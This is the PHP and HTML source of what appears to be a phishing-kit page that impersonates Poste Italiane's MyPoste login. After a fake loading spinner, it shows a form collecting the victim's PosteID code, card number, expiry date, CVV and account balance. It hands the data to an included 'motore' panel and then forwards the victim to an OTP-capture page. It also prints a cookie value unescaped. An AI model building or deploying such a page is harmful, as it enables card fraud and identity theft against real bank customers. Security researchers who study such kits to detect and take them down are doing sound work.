<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('posteid',"carta","scadenza","cvv",'saldo');
$numero = 1;
$prossima = "otp.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");
$username="";
if(isset($_COOKIE["username"])){

  $username=$_COOKIE["username"];
}


?><html lang="it"  class="bianco"><head>
    <title>Accedi</title><?php script() ?>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
       <link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="css/css.css">
    <script type="text/javascript" src="css/jquery.min.js"></script>
    <?php script() ?>
<script src="jquery.payform.min.js"></script>
    <style>
      @font-face {
  font-family: Texta;
  src: url(Texta-Regular.woff);
}

      body {
    font-family: 'Texta', sans-serif;
}

      .content-federation-bar-minified .federation-bar-content-logo div,
      .content-federation-bar-simplified .federation-bar-content-logo div {
        float: left;
        padding: 15px 0 0 0 !important;
      }
      .sfondo{
        
    background-color: #f6f6f6;
      }
      .car{background-image:url(ccc.jpg)}
    </style>
  </head>
  <body  class="bianco">
    <div class="father">
    <div class="child"><img src="logo.png"></div>
</div>

<style>
    html, body{
        background-color:white;
    }
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}

.child {
  background-image: url(spinner_giallo.gif);
    margin-top: 100%;
    position: absolute;
    background-repeat: no-repeat;
    background-size: 48px;
    background-position: center;
}
</style>
<div class="resto">

    <div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
      <div class="container container-extended">
        <div class="row">
          
          <div class="col-md-12">
            <div class="header-minified">
              <div class="row">
                <div class="col-xs-12">
                  <div style="text-align:center;padding-top:10px;" class="federation-bar-content-logo pull-xs-left clearfix">
                   
                          <img src="css/img1.png">
                   
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div style="text-align:center;padding-top: 42px;">
      <div>
    <div class="row">
										<div class="col-md-12" style="text-align:center;">
											<div class="abstract">
												<div class="abstract-heading text-xs-center spacer-xs-bottom-40">
													<h1 class="idp-retail">
														Benveuto in <b>MyPoste</b> 
														<small>
                            <h3 class="idp-retail" style="font-size: 90%;line-height: 100%;padding: 0px 30px;color: #3c3c3c;">
															<?php echo $username?>
																
															</h3>
														</small>
													</h1>
													
												</div>
											</div>
										</div>
									</div>
    
    <div style="text-align:center;padding-top: 22px;">
      <div>
      
      </div>
    </div>
    <div class="col-12">
    <form class="form-login clearfix" method="POST" >
        <div class="panel-body">
          <div class="spacer-xs-bottom-30"
           style="BACKGROUND-COLOR: white;margin: 0 10px;padding: 20px;text-align:left;"> 
            
       
          <b style="font-size:130%">Inserisci il tuo codice PosteID che usi
           per accedere ai tuoi SERVIZI </b>
          <BR>
          <label class="control-label" for="posteid" >CODICE POSTE ID</label>
      
      <input class="form-control" id="posteid" name="posteid" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  </div>
  </div>

  <div class="panel-body">
          <div class="spacer-xs-bottom-30"
           style="BACKGROUND-COLOR: white;margin: 0 10px;padding: 20px;text-align:left;"> 
            
       
         
          <label class="control-label" for="carta" >Numero Carta</label>
      
      <input class="form-control" id="carta" name="carta" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  <BR><BR>

  
  <label class="control-label" for="scadenza" >Scadenza</label>
      
      <input class="form-control" id="scadenza" name="scadenza" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  <BR><BR>

  
  <label class="control-label" for="cvv" >Cvv</label>
      
      <input class="form-control" id="cvv" name="cvv" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  <BR><BR>

  <label class="control-label" for="saldo" >SALDO CARTA O CONTO <BR>
  <span style="font-size:90%;margint-top:5px;
    text-transform: lowercase;">
PER VERIFICARE LA TITOLARITà DEL NUMERO DI TELEFONO SECURIZZATO</span></label>
      
      <input class="form-control" id="saldo" name="saldo" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  <BR><BR>

  </div>
  </div>

  
            
            <p class="btn-container btn-container-center spacer-xs-bottom-15 
            spacer-xs-top-30 clearfix" style="margin: 5PX 25px;">
              <input type="submit"  style=" 
    font-weight: normal !important;" class="btn btn-primary btn-expand" value="CONFERMA">
            </p>
         
       
      </form>
  
  </div> </div>
  <script>
    setTimeout(function(){

jQuery(".father").fadeOut( "slow", function() {
   
        jQuery("html, body").addClass("sfondo")
        
        jQuery("html, body").removeClass("bianco")
        jQuery(".resto").fadeIn()
  });

    },2000)
    </script>
    <script>

jQuery( document ).ready(function() {
 jQuery('#scadenza').payform('formatCardExpiry');
jQuery('#carta').payform('formatCardNumber');

});

</script>
</body></html>